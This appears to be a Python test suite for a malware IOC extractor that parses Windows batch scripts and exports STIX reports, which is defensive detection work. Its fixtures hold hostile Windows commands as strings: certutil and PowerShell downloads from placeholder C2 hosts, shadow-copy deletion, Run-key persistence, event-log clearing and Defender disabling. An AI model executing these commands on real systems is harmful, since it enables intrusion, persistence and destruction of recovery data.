"""
Comprehensive unit and integration test suite for AST-based Malware IOC Extractor (M18).
Covers network indicators, file drops, LOLBins, MITRE ATT&CK mappings, defanging,
multi-format exports (JSON, CSV, Markdown, STIX 2.1), filtering, memory zeroization, and CLI.
"""

import csv
import io
import json
import os
import shutil
import sys
import tempfile
import unittest

from src.ast_nodes import CommandNode, LiteralNode, RedirectNode, ScriptNode
from src.cli import main as cli_main
from src.ioc import (
    IOCExtractionResult,
    IOCExtractor,
    IOCItem,
    IOCMetrics,
    IOCSeverity,
    IOCTransformPass,
    IOCType,
    MitreAttackMapping,
    MitreTactic,
    defang_domain,
    defang_ioc,
    defang_ipv4,
    defang_ipv6,
    defang_url,
    export_csv,
    export_markdown,
    export_stix_bundle,
    extract_iocs,
    get_mitre_mapping,
)


class TestIOCModelsAndDefanging(unittest.TestCase):
    """Test cases for IOC data models, MITRE catalog, and defanging protocols."""

    def test_defang_url_protocols_and_hosts(self):
        self.assertEqual(defang_url("http://evil.com/path"), "hxxp://evil[.]com/path")
        self.assertEqual(defang_url("https://malware.org/drop.exe"), "hxxps://malware[.]org/drop.exe")
        self.assertEqual(defang_url("ftp://c2.server.net/payload"), "fxp://c2[.]server[.]net/payload")
        self.assertEqual(defang_url("sftp://user@host.org/f"), "sfxp://user@host[.]org/f")

    def test_defang_ip_and_domain(self):
        self.assertEqual(defang_ipv4("192.168.1.1"), "192[.]168[.]1[.]1")
        self.assertEqual(defang_ipv6("2001:db8::1"), "2001[:]db8[::]1")
        self.assertEqual(defang_domain("attacker-c2.xyz"), "attacker-c2[.]xyz")
        self.assertEqual(defang_ioc(IOCType.EMAIL, "bad@actor.com"), "bad[at]actor[.]com")

    def test_ioc_item_auto_defang_and_serialization(self):
        item = IOCItem(ioc_type=IOCType.URL, value="http://evil-domain.com/drop.exe", confidence=0.95, severity=IOCSeverity.HIGH, context="certutil download")
        self.assertEqual(item.defanged_value, "hxxp://evil-domain[.]com/drop.exe")
        d = item.to_dict()
        self.assertEqual(d["type"], "url")
        self.assertEqual(d["defanged_value"], "hxxp://evil-domain[.]com/drop.exe")
        self.assertEqual(d["confidence"], 0.95)

    def test_mitre_catalog_resolution(self):
        m = get_mitre_mapping("T1105")
        self.assertIsNotNone(m)
        self.assertEqual(m.technique_name, "Ingress Tool Transfer")
        self.assertEqual(m.tactic, MitreTactic.COMMAND_AND_CONTROL)
        self.assertIn("attack.mitre.org", m.reference_url)

        m_sub = get_mitre_mapping("T1059.003")
        self.assertIsNotNone(m_sub)
        self.assertEqual(m_sub.technique_name, "Windows Command Shell")
        self.assertEqual(m_sub.tactic, MitreTactic.EXECUTION)


class TestIOCExtractorNetworkAndFiles(unittest.TestCase):
    """Test cases for extracting IPv4/IPv6, URLs, domains, and file drop artifacts."""

    def setUp(self):
        self.extractor = IOCExtractor()

    def test_ipv4_and_port_extraction(self):
        code = "curl http://198.51.100.25:8080/beacon.exe\nping 10.0.0.1"
        res = self.extractor.extract_from_source(code)
        ips = [i.value for i in res.iocs if i.ioc_type == IOCType.IPV4]
        self.assertIn("198.51.100.25:8080", ips)
        self.assertIn("10.0.0.1", ips)

    def test_invalid_ipv4_octets_ignored(self):
        code = "set IP=999.300.200.100\necho 1.2.3.4"
        res = self.extractor.extract_from_source(code)
        ips = [i.value for i in res.iocs if i.ioc_type == IOCType.IPV4]
        self.assertNotIn("999.300.200.100", ips)
        self.assertIn("1.2.3.4", ips)

    def test_ipv6_extraction(self):
        code = "set ADDR=2001:0db8:85a3:0000:0000:8a2e:0370:7334\nping fe80::1"
        res = self.extractor.extract_from_source(code)
        ip6s = [i.value for i in res.iocs if i.ioc_type == IOCType.IPV6]
        self.assertTrue(any("2001:0db8" in ip for ip in ip6s))
        self.assertTrue(any("fe80::1" in ip for ip in ip6s))

    def test_url_and_domain_extraction(self):
        code = (
            "certutil -urlcache -split -f https://raw.githubusercontent.com/payload/main.bin payload.bin\n"
            "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://c2.evil-corp.xyz/stage2.exe', 's2.exe')\""
        )
        res = self.extractor.extract_from_source(code)
        urls = [i.value for i in res.iocs if i.ioc_type == IOCType.URL]
        domains = [i.value for i in res.iocs if i.ioc_type == IOCType.DOMAIN]

        self.assertIn("https://raw.githubusercontent.com/payload/main.bin", urls)
        self.assertIn("http://c2.evil-corp.xyz/stage2.exe", urls)
        self.assertTrue(any("evil-corp.xyz" in d for d in domains))

    def test_file_drop_via_redirection_and_copy(self):
        code = (
            "echo mz_header > %TEMP%\\evil.exe\n"
            "type data >> C:\\Windows\\Temp\\inject.dll\n"
            "copy malicious.bat %APPDATA%\\persist.cmd"
        )
        res = self.extractor.extract_from_source(code)
        drops = [i.value for i in res.iocs if i.ioc_type == IOCType.FILE_DROP]
        self.assertTrue(any("evil.exe" in d for d in drops))
        self.assertTrue(any("inject.dll" in d for d in drops))
        self.assertTrue(any("persist.cmd" in d for d in drops))

    def test_hash_extraction(self):
        md5 = "e4d909c290d0fb1ca068ffaddf22cbd0"
        sha256 = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        code = f"certutil -hashfile evil.exe SHA256\nrem Expected: {sha256}\nset HASH={md5}"
        res = self.extractor.extract_from_source(code)
        hashes = [i.value for i in res.iocs if i.ioc_type in (IOCType.HASH_MD5, IOCType.HASH_SHA256)]
        self.assertIn(sha256.lower(), hashes)
        self.assertIn(md5.lower(), hashes)


class TestIOCExtractorLOLBinsAndMitre(unittest.TestCase):
    """Test cases for identifying LOLBins and mapping MITRE ATT&CK techniques."""

    def setUp(self):
        self.extractor = IOCExtractor()

    def test_lolbins_identification(self):
        code = (
            "certutil.exe -urlcache -split -f http://evil.com/x.exe x.exe\n"
            "bitsadmin /transfer job http://evil.com/b.dll %TEMP%\\b.dll\n"
            "mshta vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"calc.exe\"\"\")\n"
            "rundll32.exe shell32.dll,Control_RunDLL\n"
            "regsvr32.exe /s /n /u /i:http://bad.com/scr.sct scrobj.dll"
        )
        res = self.extractor.extract_from_source(code)
        lolbins = [i.value for i in res.iocs if i.ioc_type == IOCType.LOLBIN]
        self.assertIn("certutil.exe", lolbins)
        self.assertIn("bitsadmin", lolbins)
        self.assertIn("mshta", lolbins)
        self.assertIn("rundll32.exe", lolbins)
        self.assertIn("regsvr32.exe", lolbins)

    def test_mitre_technique_disambiguation(self):
        code = (
            "vssadmin delete shadows /all /quiet\n"
            "wmic shadowcopy delete\n"
            "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d %TEMP%\\b.exe\n"
            "schtasks /create /sc onlogon /tn Update /tr %TEMP%\\b.exe\n"
            "wevtutil cl System"
        )
        res = self.extractor.extract_from_source(code)
        techniques = {i.mitre_attack.technique_id for i in res.iocs if i.mitre_attack}

        self.assertIn("T1490", techniques)     # Inhibit System Recovery (vssadmin, wmic)
        self.assertIn("T1547.001", techniques) # Registry Run Keys (reg add)
        self.assertIn("T1053.005", techniques) # Scheduled Task (schtasks)
        self.assertIn("T1070.001", techniques) # Clear Windows Event Logs (wevtutil)

    def test_powershell_and_certutil_techniques(self):
        code = (
            "powershell -enc JABzACAAPQAgACcAZQB4AGUAYwB1AHQAZQAnAA==\n"
            "certutil -decode payload.b64 payload.exe"
        )
        res = self.extractor.extract_from_source(code)
        techniques = {i.mitre_attack.technique_id for i in res.iocs if i.mitre_attack}
        self.assertIn("T1027", techniques)  # Obfuscated / Encoded command
        self.assertIn("T1140", techniques)  # Deobfuscate / Decode Files


class TestIOCExporters(unittest.TestCase):
    """Test cases for CSV, Markdown, JSON, and STIX 2.1 Threat Intelligence exporters."""

    def setUp(self):
        m1105 = get_mitre_mapping("T1105")
        self.sample_result = IOCExtractionResult(
            iocs=[
                IOCItem(ioc_type=IOCType.URL, value="http://malicious-c2.net/payload.exe", confidence=0.95, severity=IOCSeverity.HIGH, mitre_attack=m1105, context="curl download"),
                IOCItem(ioc_type=IOCType.IPV4, value="198.51.100.5", confidence=0.90, severity=IOCSeverity.HIGH, mitre_attack=m1105, context="C2 connection"),
                IOCItem(ioc_type=IOCType.LOLBIN, value="certutil.exe", confidence=0.90, severity=IOCSeverity.MEDIUM, mitre_attack=m1105, context="certutil invocation"),
            ],
            source_file="test_sample.bat",
        )

    def test_csv_export(self):
        csv_str = export_csv(self.sample_result)
        reader = list(csv.reader(io.StringIO(csv_str)))
        self.assertGreater(len(reader), 3)
        header = reader[0]
        self.assertIn("ioc_type", header)
        self.assertIn("defanged_value", header)
        self.assertIn("mitre_id", header)
        self.assertTrue(any("hxxp://malicious-c2[.]net/payload.exe" in row for row in reader))

    def test_markdown_export(self):
        md = export_markdown(self.sample_result)
        self.assertIn("# Malware Indicators of Compromise (IOC) Report", md)
        self.assertIn("Total IOCs Extracted", md)
        self.assertIn("T1105", md)
        self.assertIn("`url`", md)
        self.assertIn("hxxp://malicious-c2[.]net/payload.exe", md)

    def test_json_export(self):
        j_str = self.sample_result.to_json()
        data = json.loads(j_str)
        self.assertEqual(data["source_file"], "test_sample.bat")
        self.assertEqual(data["ioc_count"], 3)
        self.assertEqual(len(data["iocs"]), 3)

    def test_stix_21_bundle_export(self):
        bundle = export_stix_bundle(self.sample_result)
        self.assertEqual(bundle["type"], "bundle")
        self.assertEqual(bundle["spec_version"], "2.1")
        self.assertTrue(bundle["id"].startswith("bundle--"))

        objects = bundle["objects"]
        indicators = [o for o in objects if o["type"] == "indicator"]
        attack_patterns = [o for o in objects if o["type"] == "attack-pattern"]
        relationships = [o for o in objects if o["type"] == "relationship"]

        self.assertGreaterEqual(len(indicators), 3)
        self.assertGreaterEqual(len(attack_patterns), 1)
        self.assertGreaterEqual(len(relationships), 1)

        # Validate STIX pattern syntax
        url_ind = next(i for i in indicators if "payload.exe" in i["pattern"])
        self.assertEqual(url_ind["pattern"], "[url:value = 'http://malicious-c2.net/payload.exe']")
        self.assertEqual(url_ind["pattern_type"], "stix")
        self.assertEqual(url_ind["confidence"], 95)


class TestIOCTransformPassAndZeroize(unittest.TestCase):
    """Test cases for IOCTransformPass, filtering, and memory zeroization."""

    def test_ioc_transform_pass_pipeline(self):
        code = "certutil -urlcache -split -f http://evil.com/mal.exe mal.exe\nmal.exe"
        res = extract_iocs(code)
        self.assertGreater(res.metrics.total_iocs_found, 0)
        self.assertGreater(res.metrics.urls_found, 0)

        # Pipeline pass execution
        from src.parser import CmdASTParser
        ast = CmdASTParser.from_source(code).parse()
        pass_instance = IOCTransformPass()
        transformed = pass_instance.transform(ast)
        self.assertIsNotNone(transformed)
        self.assertIsNotNone(pass_instance.ioc_result)
        self.assertGreater(pass_instance.metrics.total_iocs_found, 0)

    def test_filtering_by_type_and_confidence(self):
        code = "echo 127.0.0.1\ncurl http://evil.com/b.exe\necho mz > drop.dll"
        res = extract_iocs(code)
        only_urls = res.filter(ioc_types=[IOCType.URL])
        self.assertTrue(all(i.ioc_type == IOCType.URL for i in only_urls.iocs))

        high_conf = res.filter(min_confidence=0.90)
        self.assertTrue(all(i.confidence >= 0.90 for i in high_conf.iocs))

    def test_memory_zeroization(self):
        res = extract_iocs("curl http://secret-host.org/payload.exe drop.exe", source_file="secret.bat")
        self.assertGreater(len(res.iocs), 0)
        res.zeroize()
        self.assertEqual(len(res.iocs), 0)
        self.assertEqual(res.metrics.total_iocs_found, 0)
        self.assertIsNone(res.source_file)


class TestIOCCLIIntegration(unittest.TestCase):
    """Integration test suite verifying CLI flags for IOC extraction and reporting."""

    def setUp(self):
        self.test_dir = tempfile.mkdtemp(prefix="cmd_ioc_cli_test_")
        self.sample_bat = os.path.join(self.test_dir, "sample_mal.bat")
        with open(self.sample_bat, "w", encoding="utf-8") as f:
            f.write("certutil -urlcache -split -f http://evil-cdn.com/trojan.exe %TEMP%\\trojan.exe\n%TEMP%\\trojan.exe\nvssadmin delete shadows /all /quiet\n")

    def tearDown(self):
        if os.path.exists(self.test_dir):
            shutil.rmtree(self.test_dir, ignore_errors=True)

    def test_cli_ioc_stdout_and_stats(self):
        sys.argv = ["cmd-ast-deobfuscator", "-i", self.sample_bat, "--ioc", "--ioc-stats"]
        stdout_capture = io.StringIO()
        old_stdout = sys.stdout
        try:
            sys.stdout = stdout_capture
            cli_main()
        finally:
            sys.stdout = old_stdout

        out = stdout_capture.getvalue()
        self.assertIn("MALWARE IOC EXTRACTION STATS", out)
        self.assertIn("Total IOCs found", out)
        self.assertIn("hxxp://evil-cdn[.]com/trojan.exe", out)

    def test_cli_multi_format_exports(self):
        json_out, csv_out, md_out, stix_out = [os.path.join(self.test_dir, f"r.{ext}") for ext in ("json", "csv", "md", "stix")]
        sys.argv = ["cmd-ast-deobfuscator", "-i", self.sample_bat, "--ioc-json", json_out, "--ioc-csv", csv_out, "--ioc-md", md_out, "--ioc-stix", stix_out]
        stdout_capture = io.StringIO()
        old_stdout = sys.stdout
        try:
            sys.stdout = stdout_capture
            cli_main()
        finally:
            sys.stdout = old_stdout
        for p in (json_out, csv_out, md_out, stix_out):
            self.assertTrue(os.path.exists(p))
        with open(json_out, "r", encoding="utf-8") as f:
            self.assertIn("iocs", json.load(f))
        with open(stix_out, "r", encoding="utf-8") as f:
            stix_data = json.load(f)
            self.assertEqual(stix_data["type"], "bundle")
            self.assertEqual(stix_data["spec_version"], "2.1")

    def test_cli_ioc_defang_flag(self):
        json_out = os.path.join(self.test_dir, "defanged_report.json")
        sys.argv = ["cmd-ast-deobfuscator", "-i", self.sample_bat, "--ioc-defang", "--ioc-json", json_out]
        stdout_capture = io.StringIO()
        old_stdout = sys.stdout
        try:
            sys.stdout = stdout_capture
            cli_main()
        finally:
            sys.stdout = old_stdout
        self.assertTrue(os.path.exists(json_out))
        with open(json_out, "r", encoding="utf-8") as f:
            data = json.load(f)
        for item in data["iocs"]:
            if item["type"] == "url":
                self.assertTrue(item["value"].startswith("hxxp://"))
                self.assertEqual(item["value"], item["defanged_value"])

    def test_adversarial_edge_cases_and_robustness(self):
        code = (
            ":: Header comment with C2: http://comment-c2.net/gate.php\n"
            "powershell -Command Invoke-WebRequest http://bad.org/drop.exe -OutFile %TEMP%\\drop.exe\n"
            "echo 192.168.1.1:70000\n"
            "echo ::ffff:192.0.2.128\n"
            "tree.com /f\n"
            "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v P /d drop.exe\n"
            "certutil -decode -f enc.txt payload.dll\n"
        )
        res = extract_iocs(code, source_file="adv.bat")
        # Line number tracking
        items_with_lines = [i for i in res.iocs if i.line_number is not None]
        self.assertGreater(len(items_with_lines), 0)

        # STIX backslash escaping
        stix = export_stix_bundle(res)
        reg_ind = next(i for i in stix["objects"] if i["type"] == "indicator" and "windows-registry-key" in i["pattern"])
        self.assertIn("HKLM\\\\Software", reg_ind["pattern"])

        # IPv4 invalid port (>65535) stripped to raw IP
        ip_vals = [i.value for i in res.iocs if i.ioc_type == IOCType.IPV4]
        self.assertIn("192.168.1.1", ip_vals)
        self.assertNotIn("192.168.1.1:70000", ip_vals)

        # IPv4-mapped IPv6 address
        ip6_vals = [i.value for i in res.iocs if i.ioc_type == IOCType.IPV6]
        self.assertIn("::ffff:192.0.2.128", ip6_vals)

        # tree.com false positive suppression
        dom_vals = [i.value.lower() for i in res.iocs if i.ioc_type == IOCType.DOMAIN]
        self.assertNotIn("tree.com", dom_vals)

        # PowerShell OutFile drop detection
        drop_vals = [i.value for i in res.iocs if i.ioc_type == IOCType.FILE_DROP]
        self.assertTrue(any("drop.exe" in d for d in drop_vals))
        self.assertTrue(any("payload.dll" in d for d in drop_vals))

        # CertUtil decode disambiguation
        cert_items = [i for i in res.iocs if i.value == "certutil" and i.mitre_attack]
        self.assertTrue(any(i.mitre_attack.technique_id == "T1140" for i in cert_items))

    def test_adversarial_round2_edge_cases(self):
        # 1. Bare :: comment false positive suppression
        clean_code = "@echo off\n:: Setup environment\nset FOO=bar\nrem regular comment\necho done"
        res_clean = extract_iocs(clean_code)
        self.assertEqual(len(res_clean.iocs), 0)

        # 2. Quoted file drop with spaces & trailing flags
        copy_code = 'copy src.bin "C:\\Program Files\\trojan.vbs" /y /b'
        res_copy = extract_iocs(copy_code)
        drops = [i.value for i in res_copy.iocs if i.ioc_type == IOCType.FILE_DROP]
        self.assertIn("C:\\Program Files\\trojan.vbs", drops)

        # 3. PowerShell quoted -OutFile with spaces
        ps_code = "powershell -c \"Invoke-WebRequest http://evil.com/x.exe -OutFile 'C:\\Program Files\\x.exe'\""
        res_ps = extract_iocs(ps_code)
        ps_drops = [i.value for i in res_ps.iocs if i.ioc_type == IOCType.FILE_DROP]
        self.assertIn("C:\\Program Files\\x.exe", ps_drops)

        # 4. Quoted registry key with spaces & defense impairment
        reg_code = 'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f'
        res_reg = extract_iocs(reg_code)
        reg_iocs = [i for i in res_reg.iocs if i.ioc_type == IOCType.REGISTRY_KEY]
        self.assertEqual(len(reg_iocs), 1)
        self.assertEqual(reg_iocs[0].value, "HKLM\\Software\\Policies\\Microsoft\\Windows Defender")
        self.assertEqual(reg_iocs[0].mitre_attack.technique_id, "T1562.001")
        self.assertEqual(reg_iocs[0].severity, IOCSeverity.HIGH)

        # 5. CertUtil slash switch and net1 defense/user commands
        disam_code = "certutil /decode in.txt out.dll\nnet1 stop windefend\nnet1 user attacker /add"
        res_disam = extract_iocs(disam_code)
        techs = {i.mitre_attack.technique_id for i in res_disam.iocs if i.mitre_attack}
        self.assertIn("T1140", techs)
        self.assertIn("T1562.001", techs)
        self.assertIn("T1136", techs)

        # 6. STIX command_line pattern
        cmd_item = IOCItem(ioc_type=IOCType.COMMAND_LINE, value="powershell -enc AAAA")
        res_bundle = export_stix_bundle(IOCExtractionResult(iocs=[cmd_item]))
        ind = next(o for o in res_bundle["objects"] if o["type"] == "indicator")
        self.assertEqual(ind["pattern"], "[process:command_line = 'powershell -enc AAAA']")

    def test_adversarial_round3_edge_cases(self):
        # 1. Runner LOLBin drops (wscript, rundll32, mshta) & system DLL suppression
        runner_code = (
            'wscript //nologo "C:\\Users\\Public\\payload.vbs"\n'
            'rundll32.exe "%TEMP%\\beacon.dll",Start\n'
            'rundll32.exe shell32.dll,Control_RunDLL\n'
            'mshta "%TEMP%\\stage.hta"\n'
        )
        res_runners = extract_iocs(runner_code)
        drops = [i.value for i in res_runners.iocs if i.ioc_type == IOCType.FILE_DROP]
        self.assertIn("C:\\Users\\Public\\payload.vbs", drops)
        self.assertIn("%TEMP%\\beacon.dll", drops)
        self.assertIn("%TEMP%\\stage.hta", drops)
        self.assertFalse(any("shell32.dll" in d for d in drops))

        # 2. Direct executed command target drops (path or script extension)
        direct_code = "%TEMP%\\trojan.exe\ncall dropper.bat\nC:\\Users\\Public\\miner.exe"
        res_direct = extract_iocs(direct_code)
        direct_drops = [i.value for i in res_direct.iocs if i.ioc_type == IOCType.FILE_DROP]
        self.assertIn("%TEMP%\\trojan.exe", direct_drops)
        self.assertIn("dropper.bat", direct_drops)
        self.assertIn("C:\\Users\\Public\\miner.exe", direct_drops)

        # 3. Tab-delimited comments and atypical rem forms
        comment_code = "rem\thttp://tab-c2.com\nrem=http://equal-c2.com"
        res_comments = extract_iocs(comment_code)
        urls = [i.value for i in res_comments.iocs if i.ioc_type == IOCType.URL]
        self.assertIn("http://tab-c2.com", urls)
        self.assertIn("http://equal-c2.com", urls)

        # 4. Markdown table integrity when defanged_value contains pipes
        pipe_item = IOCItem(ioc_type=IOCType.COMMAND_LINE, value="type secret.txt | findstr /i evil")
        md_table = export_markdown(IOCExtractionResult(iocs=[pipe_item]))
        for row in md_table.splitlines():
            if row.startswith("| `command_line`"):
                self.assertEqual(row.count("|") - row.count("\\|"), 7)

        # 5. CSV single-line context sanitization
        csv_item = IOCItem(ioc_type=IOCType.URL, value="http://x.com", context="line1\r\nline2\nline3")
        csv_out = export_csv(IOCExtractionResult(iocs=[csv_item]))
        self.assertEqual(len([l for l in csv_out.splitlines() if l.strip()]), 2)

        # 6. STIX pattern newline escaping
        stix_item = IOCItem(ioc_type=IOCType.COMMAND_LINE, value="echo 1\necho 2")
        bundle = export_stix_bundle(IOCExtractionResult(iocs=[stix_item]))
        ind = next(o for o in bundle["objects"] if o["type"] == "indicator")
        self.assertIn("\\n", ind["pattern"])
        self.assertNotIn("\n", ind["pattern"])

        # 7. IOCMetrics.from_iocs and auto-calculation in IOCExtractionResult
        auto_res = IOCExtractionResult(iocs=[pipe_item, csv_item])
        self.assertEqual(auto_res.metrics.total_iocs_found, 2)
        self.assertEqual(auto_res.metrics.urls_found, 1)


if __name__ == "__main__":
    unittest.main()

